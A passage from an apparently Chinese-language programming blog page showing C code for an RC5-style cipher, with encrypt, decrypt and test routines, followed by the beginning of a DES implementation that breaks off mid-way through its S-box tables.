class="number">1</span>;i&lt;=r;i++)</div><div class="line">        &#123;</div><div class="line">            X=ROTL((X^Y),Y) + S[<span class="number">2</span>*i]; <span class="comment">//异或，循环移位，相加</span></div><div class="line">            Y=ROTL((Y^X),X) + S[<span class="number">2</span>*i+<span class="number">1</span>];</div><div class="line">        &#125;</div><div class="line">        Out[j]=X;</div><div class="line">        Out[j+<span class="number">1</span>]=Y; <span class="comment">//密文</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">/**6、    解密函数</span></div><div class="line"><span class="comment"> 解密函数</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decipher</span><span class="params">(TWOBYTEINT* In,TWOBYTEINT* Out,TWOBYTEINT* S)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j;</div><div class="line">    TWOBYTEINT X,Y;</div><div class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;NoOfData;j+=<span class="number">2</span>)</div><div class="line">    &#123;</div><div class="line">        X = In[j];</div><div class="line">        Y = In[j+<span class="number">1</span>];</div><div class="line">        <span class="keyword">for</span>(i=r;i&gt;<span class="number">0</span>;i--)</div><div class="line">        &#123;</div><div class="line"><span class="comment">//            Y = ROTR(Y-S[2*i+1],X)^X; //相减，循环移位，异或</span></div><div class="line"><span class="comment">//            X = ROTR(X-S[2*i],Y)^Y;</span></div><div class="line">            </div><div class="line"><span class="comment">//            Y = ROTR(Y-S[2*i+1],X)^X; //相减，循环移位，异或</span></div><div class="line"><span class="comment">//            X = ROTR(X-S[2*i],Y)^Y;</span></div><div class="line"><span class="comment">//            改为（对数据进行强制转换）：</span></div><div class="line">            Y = ROTR((<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>)(Y-S[<span class="number">2</span>*i+<span class="number">1</span>]),X)^X;</div><div class="line">            X = ROTR((<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>)(X-S[<span class="number">2</span>*i]),Y)^Y;</div><div class="line">        &#125;</div><div class="line">        Out[j]=X - S[<span class="number">0</span>];</div><div class="line">        Out[j+<span class="number">1</span>]=Y - S[<span class="number">1</span>]; <span class="comment">//明文</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/**7、    主函数测试</span></div><div class="line"><span class="comment"> </span></div><div class="line"><span class="comment"> 主函数</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    TWOBYTEINT ChildKeyS[<span class="number">2</span>*r+<span class="number">2</span>]; <span class="comment">//64bit</span></div><div class="line">    TWOBYTEINT ChildKey1[<span class="number">26</span>]=&#123;<span class="number">0x9b9a</span>&#125;;</div><div class="line">    <span class="comment">//&#123;0xe25b,0x4338,0x36ab,0xd59f,0x9b9a,0xc0f1,0xdc4f,</span></div><div class="line">    <span class="comment">// 0xc0d2,0xf03a,0xff5a,0x771f,0x5952,0xb797,0x28ad,</span></div><div class="line">    <span class="comment">//0x5c9a,0xfd9a,0xbd4b,0x3b12,0xd198,0x17f8,0x7f19,</span></div><div class="line">    <span class="comment">//0x458e,0x1629,0xaa8a,0xb609,0x9b3c&#125;;//&#123;123,434,1,123,1,34,123,56,123,8&#125;;</span></div><div class="line">    BYTE KeyK[b];<span class="comment">//8bit=byte</span></div><div class="line">    InitialKey(KeyK,b); <span class="comment">//生成初始密钥</span></div><div class="line">    <span class="keyword">int</span> k;</div><div class="line">    generateChildKey(KeyK,ChildKeyS); <span class="comment">//根据初始密钥生成子密钥</span></div><div class="line"><span class="comment">//    TWOBYTEINT Source[]=&#123;'1','2','1','1'&#125;;//测试明文</span></div><div class="line">    <span class="keyword">char</span> arr[] = <span class="string">"what can i do for you?"</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ll = <span class="built_in">strlen</span>(arr);</div><div class="line">    <span class="keyword">int</span> m;</div><div class="line">    <span class="keyword">for</span> (m=<span class="number">0</span>; NoOfData * m &lt; ll; m++) &#123;</div><div class="line">        TWOBYTEINT Source[<span class="number">4</span>] = &#123;arr[<span class="number">4</span> * m], arr[<span class="number">4</span> * m + <span class="number">1</span>], arr[<span class="number">4</span> * m + <span class="number">2</span>], arr[<span class="number">4</span> * m + <span class="number">3</span>]&#125;;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"加密以前的明文:"</span>);</div><div class="line">        <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;NoOfData;k++)</div><div class="line">        &#123;</div><div class="line">            </div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%.4X "</span>,Source[k]); <span class="comment">//16进制输出</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>,Source[k]); <span class="comment">//16进制输出</span></div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">        TWOBYTEINT Dest[NoOfData]; <span class="comment">//用来存储密文</span></div><div class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)</div><div class="line">        &#123;</div><div class="line">            ChildKey1[k]=ChildKeyS[k];<span class="comment">//如果此处自定义简单的数值为加密密钥，则可以解密出密文</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%.4X "</span>,ChildKey1[k]);</div><div class="line">            </div><div class="line">        &#125;</div><div class="line">        Encipher(Source,Dest,ChildKey1); <span class="comment">//加密</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"加密以后的密文:"</span>);</div><div class="line">        <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;NoOfData;k++)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%.4X "</span>,Dest[k]);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>,Dest[k]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">        TWOBYTEINT Data[NoOfData]=&#123;<span class="number">0</span>&#125;; <span class="comment">//用来存储解密后的密文</span></div><div class="line">        Decipher(Dest,Data,ChildKey1); <span class="comment">//解密</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"解密以后的明文:"</span>);</div><div class="line">        <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;NoOfData;k++)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%.4X "</span>,Data[k]);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>,Data[k]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n\n"</span>);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">//printf("sizeof unsigned short int: %d",sizeof(unsigned short int));</span></div><div class="line">    system(<span class="string">"pause\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="des"><a href="#des" class="headerlink" title="des"></a>des</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"memory.h"</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"time.h"</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span>  </span></div><div class="line">  </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PLAIN_FILE_OPEN_ERROR -1  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_FILE_OPEN_ERROR -2  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CIPHER_FILE_OPEN_ERROR -3  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1   </span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> ElemType;  </div><div class="line"><span class="comment">//初始置换表IP  </span></div><div class="line"><span class="keyword">int</span> IP_Table[<span class="number">64</span>] = &#123;  <span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,  </div><div class="line">                                 <span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,  </div><div class="line">                                 <span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,  </div><div class="line">                                 <span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,  </div><div class="line">                                 <span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">0</span>,  </div><div class="line">                                 <span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,  </div><div class="line">                                 <span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,  </div><div class="line">                                 <span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>&#125;;   </div><div class="line"><span class="comment">//逆初始置换表IP^-1  </span></div><div class="line"><span class="keyword">int</span> IP_1_Table[<span class="number">64</span>] = &#123;<span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,  </div><div class="line">           <span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,  </div><div class="line">           <span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,  </div><div class="line">           <span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,  </div><div class="line">           <span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,  </div><div class="line">           <span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,  </div><div class="line">           <span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span>,  </div><div class="line">           <span class="number">32</span>,<span class="number">0</span>,<span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>&#125;;  </div><div class="line">  </div><div class="line"><span class="comment">//扩充置换表E  </span></div><div class="line"><span class="keyword">int</span> E_Table[<span class="number">48</span>] = &#123;<span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,  </div><div class="line">                  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,  </div><div class="line">                  <span class="number">7</span>,  <span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,  </div><div class="line">                  <span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,  </div><div class="line">                  <span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,  </div><div class="line">                  <span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,  </div><div class="line">                  <span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,  </div><div class="line">                  <span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>, <span class="number">0</span>&#125;;  </div><div class="line">  </div><div class="line"><span class="comment">//置换函数P  </span></div><div class="line"><span class="keyword">int</span> P_Table[<span class="number">32</span>] = &#123;<span class="number">15</span>,<span class="number">6</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">28</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">16</span>,  </div><div class="line">                  <span class="number">0</span>,<span class="number">14</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">30</span>,<span class="number">9</span>,  </div><div class="line">                  <span class="number">1</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">13</span>,<span class="number">31</span>,<span class="number">26</span>,<span class="number">2</span>,<span class="number">8</span>,  </div><div class="line">                  <span class="number">18</span>,<span class="number">12</span>,<span class="number">29</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">24</span>&#125;;  </div><div class="line">  </div><div class="line"><span class="comment">//S盒  </span></div><div class="line"><span class="keyword">int</span> S[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] =<span class="comment">//S1  </span></div><div class="line">            &#123;&#123;&#123;<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>&#125;,  </div><div class="line">              &#123;<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,  </div><div class="line">                &#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>&#125;,  </div><div class="line">                &#123;<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>&#125;&#125;,  </div><div class="line">                <span class="comment">//S2  </span></div><div class="line">              &#123;&#123;<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>&#125;,  </div><div class="line">              &#123;<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>&#125;,  </div><div class="line">              &#123;<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>&#125;,  </div><div class="line">              &#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>&#125;&#125;,  </div><div class="line">              <span class="comment">//S3  </span></div><div class="line">              &#123;&#123;<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>&#125;,  </div><div class="line">              &#123;<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>&#125;,  </div><div class="line">                &#123;<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>&#125;,  </div><div class="line">              &#123;<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>&#125;&#125;,  </div><div class="line">              <span class="comment">//S4  </span></div><div class="line">              &#123;&#123;<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>&#125;,  </div><div class="line">              &#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,  </div><div class="line">              &#123;<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>&#125;,  </div><div class="line">              &#123;<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>&#125;&#125;,  </div><div class="line">              <span class="comment">//S5  </span></div><div class="line">              &#123;&#123;<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,  </div><div class="line">              &#123;<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,  </div><div class="line">              &#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span 